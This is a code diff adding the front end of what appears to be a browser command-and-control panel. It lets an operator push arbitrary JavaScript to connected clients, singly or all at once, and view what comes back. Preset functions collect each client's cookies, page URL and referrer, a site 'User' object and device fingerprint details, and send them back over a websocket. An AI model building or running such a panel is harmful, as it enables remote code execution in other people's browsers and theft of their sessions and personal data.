+                    <h3>No Commands Yet</h3>
+                    <p>Use the command bar above to send JavaScript to clients.</p>
+                </div>
+            `;
+            return;
+        }
+
+        container.innerHTML = commandHistoryList.slice().reverse().map((cmd, i) => `
+            <div class="detail-item" style="margin-bottom: 8px; cursor: pointer;" onclick="reuseCommand(${commandHistoryList.length - 1 - i})">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+                    <span style="font-size: 10px; color: var(--text-muted);">${new Date(cmd.timestamp).toLocaleTimeString()}</span>
+                    <span class="meta-tag">Sent to ${cmd.sentTo}</span>
+                </div>
+                <div style="font-size: 12px; color: var(--text-secondary); word-break: break-all;">${escapeHtml(cmd.script)}</div>
+            </div>
+        `).join('');
+    }
+
+    function reuseCommand(index) {
+        const cmd = commandHistoryList[index];
+        if (cmd) {
+            if (inputMode === 'single') {
+                document.getElementById('commandInput').value = cmd.script;
+            } else {
+                document.getElementById('commandTextarea').value = cmd.script;
+            }
+        }
+    }
+
+    function showTab(tabId) {
+        document.getElementById('noSelection').style.display = 'none';
+        document.getElementById('clientDetail').style.display = 'none';
+        document.getElementById('userData').style.display = 'none';
+        document.getElementById('commandHistory').style.display = 'none';
+        document.getElementById(tabId).style.display = 'block';
+    }
+
+    function showNoSelection() {
+        document.getElementById('noSelection').style.display = 'flex';
+        document.getElementById('clientDetail').style.display = 'none';
+        document.getElementById('userData').style.display = 'none';
+        document.getElementById('commandHistory').style.display = 'none';
+    }
+
+    function switchTab(tab) {
+        currentTab = tab;
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        event.target.classList.add('active');
+
+        if (tab === 'detail') {
+            if (selectedClientId) renderDetail();
+            else showNoSelection();
+        } else if (tab === 'data') {
+            renderUserDataTab();
+        } else if (tab === 'history') {
+            renderCommandHistory();
+        }
+    }
+
+    // Command functions
+    function sendCommand() {
+        const script = inputMode === 'single'
+            ? document.getElementById('commandInput').value.trim()
+            : document.getElementById('commandTextarea').value.trim();
+
+        if (!script) return;
+
+        if (targetClientId) {
+            sendToClient(targetClientId, script);
+        } else {
+            broadcastCommand(script);
+        }
+    }
+
+    function broadcastCommand(script) {
+        fetch(`/api/broadcast-js?script=${encodeURIComponent(script)}`)
+            .then(r => r.json())
+            .then(data => {
+                showToast(`Sent to ${data.sentTo} clients`, 'success');
+                if (inputMode === 'single') document.getElementById('commandInput').value = '';
+            })
+            .catch(err => showToast('Failed to send: ' + err.message, 'error'));
+    }
+
+    function sendToClient(id, script) {
+        fetch(`/api/send-to?id=${id}&script=${encodeURIComponent(script)}`)
+            .then(r => r.json())
+            .then(data => {
+                showToast(`Sent to client #${id}: ${data.status}`, data.status === 'ok' ? 'success' : 'error');
+            })
+            .catch(err => showToast('Failed: ' + err.message, 'error'));
+    }
+
+    function quickCommand(script) {
+        if (targetClientId) {
+            sendToClient(targetClientId, script);
+        } else {
+            broadcastCommand(script);
+        }
+    }
+
+    function setTarget(id) {
+        targetClientId = id;
+        document.getElementById('targetIndicator').style.display = 'flex';
+        document.getElementById('targetName').textContent = `Client #${id}`;
+        renderClientList();
+        showToast(`Now targeting Client #${id}`, 'info');
+    }
+
+    function clearTarget() {
+        targetClientId = null;
+        document.getElementById('targetIndicator').style.display = 'none';
+        renderClientList();
+        showToast('Broadcasting to all clients', 'info');
+    }
+
+    function requestAllUserInfo() {
+        fetch('/api/request-user-info')
+            .then(r => r.json())
+            .then(data => showToast(`Requested user info from ${data.sentTo} clients`, 'success'))
+            .catch(err => showToast('Failed: ' + err.message, 'error'));
+    }
+
+    function fetchUserData(id) {
+        const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify(typeof User !== "undefined" ? User : {error:"User not defined"}) }, "*");';
+        sendToClient(id, script);
+        showToast(`Requested user data from Client #${id}`, 'info');
+    }
+
+    function fetchPageInfo(id) {
+        const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify({url:location.href,title:document.title,cookies:document.cookie,referrer:document.referrer}) }, "*");';
+        sendToClient(id, script);
+    }
+
+    function fetchDeviceInfo(id) {
+        const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify({innerWidth,innerHeight,screen:{w:screen.width,h:screen.height},userAgent:navigator.userAgent,language:navigator.language,platform:navigator.platform,cookieEnabled:navigator.cookieEnabled,onLine:navigator.onLine}) }, "*");';
+        sendToClient(id, script);
+    }
+
+    function refreshClients() {
+        fetch('/api/clients')
+            .then(r => r.json())
+            .then(data => {
+                clientsMap = {};
+                data.forEach(c => clientsMap[c.id] = c);
+                renderClientList();
+                updateStats();
+                showToast(`Refreshed: ${data.length} clients`, 'success');
+            })
+            .catch(err => showToast('Refresh failed: ' + err.message, 'error'));
+    }
+
+    function setInputMode(mode) {
+        inputMode = mode;
+        document.getElementById('singleLineInput').style.display = mode === 'single' ? 'block' : 'none';
+        document.getElementById('multiLineInput').style.display = mode === 'multi' ? 'block' : 'none';
+        document.querySelectorAll('.mode-toggle button').forEach(b => b.classList.remove('active'));
+        event.target.classList.add('active');
+    }
+
+    // Live Feed
+    function addFeedEntry(type, source, content) {
+        const container = document.getElementById('liveFeed');
+        // Remove empty state
+        const empty = container.querySelector('.empty-state');
+        if (empty) empty.remove();
+
+        const entry = document.createElement('div');
+        entry.className = 'feed-entry new';
+        entry.innerHTML = `
+            <div>
+                <span class="feed-time">${new Date().toLocaleTimeString()}</span>
+                <span class="feed-client">${escapeHtml(source)}</span>
+                <span class="feed-type ${type}">${type}</span>
+            </div>
+            <div class="feed-content">${escapeHtml(content)}</div>
+        `;
+
+        container.insertBefore(entry, container.firstChild);
+
+        // Keep max 200 entries
+        while (container.children.length > 200) {
+            container.removeChild(container.lastChild);
+        }
+    }
+
+    function clearFeed() {
+        document.getElementById('liveFeed').innerHTML = '';
+    }
+
+    // Utility
+    function updateStats() {
+        document.getElementById('totalClients').textContent = Object.keys(clientsMap).length;
+        document.getElementById('totalMessages').textContent = messageCount;
+        document.getElementById('totalCommands').textContent = commandCount;
+    }
+
+    function timeSince(dateStr) {
+        if (!dateStr) return 'N/A';
+        const seconds = Math.floor((new Date() - new Date(dateStr)) / 1000);
+        if (seconds < 5) return 'just now';
+        if (seconds < 60) return seconds + 's';
+        const minutes = Math.floor(seconds / 60);
+        if (minutes < 60) return minutes + 'm';
+        const hours = Math.floor(minutes / 60);
+        if (hours < 24) return hours + 'h';
+        return Math.floor(hours / 24) + 'd';
+    }
+
+    function escapeHtml(str) {
+        if (typeof str !== 'string') str = String(str);
+        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    }
+
+    function syntaxHighlight(json) {
+        json = escapeHtml(json);
+        return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
+            let cls = 'json-number';
+            if (/^"/.test(match)) {
+                if (/:$/.test(match)) {
+                    cls = 'json-key';
+                } else {
+                    cls = 'json-string';
+                }
+            } else if (/true|false/.test(match)) {
+                cls = 'json-boolean';
+            } else if (/null/.test(match)) {
+                cls = 'json-null';
+            }
+            return '<span class="' + cls + '">' + match + '</span>';
+        });
+    }
+
+    function showToast(message, type = 'info') {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = `toast ${type}`;
+        toast.innerHTML = `<span>${escapeHtml(message)}</span>`;
+        container.appendChild(toast);
+        setTimeout(() => {
+            toast.style.opacity = '0';
+            toast.style.transform = 'translateX(100%)';
+            toast.style.transition = 'all 0.3s ease';
+            setTimeout(() => toast.remove(), 300);
+        }, 3000);
+    }
+
+    // Search
+    document.getElementById('clientSearch').addEventListener('input', renderClientList);
+
+    // Auto-refresh time-based displays
+    setInterval(() => {
+        renderClientList();
+    }, 10000);
+
+    // Init
+    connectWS();
+</script>
+</body>
+</html>
